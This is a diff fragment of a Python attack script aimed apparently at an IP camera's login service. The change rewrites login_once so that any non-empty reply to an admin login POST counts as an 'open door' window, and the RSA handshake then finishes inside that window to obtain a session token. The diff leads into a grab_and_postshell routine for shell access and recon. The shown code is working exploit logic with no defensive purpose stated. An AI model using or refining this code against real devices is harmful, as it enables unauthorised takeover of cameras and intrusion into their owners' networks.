@@ -35,16 +35,16 @@ def emit(event, details):
         pass
 
 def login_once():
-    # 1 s is shorter than the TLS handshake on this SoC once it is cold; curl -m 3 answers
-    # 200 in windows where the 1 s probe never connects, so the old value hid every window.
+    """Detect an open door on ANY answer, then do the real handshake.
+
+    A cold camera answers the first POST with -40407 (RSA key + nonce), not a stok, so a probe
+    that requires stok never reports a window at all. Non-empty body == window; the RSA path in
+    T.login then finishes inside the same window.
+    """
     r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3)
-    try:
-        j = json.loads(r)
-        if "stok" in j:
-            return j["stok"]
-    except Exception:
-        pass
-    return None
+    if not r.strip():
+        return None
+    return T.login(HOST)
 
 def grab_and_postshell():
     log("SHELL — in-band recon grab")
